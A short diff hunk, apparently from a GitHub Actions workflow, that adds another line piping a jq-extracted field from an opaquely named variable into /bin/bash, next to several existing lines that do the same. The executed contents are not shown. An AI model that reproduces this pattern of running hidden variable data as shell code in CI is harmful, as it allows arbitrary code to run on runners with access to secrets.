@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$iry5496" | jq -r .shetb66442 | /bin/bash
           printf '%s' "$itbp0" | jq -r .a256 | /bin/bash
           printf '%s' "$b21" | jq -r .kbx91397 | /bin/bash
+          echo $guosn4 | jq -r .lsb07886 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
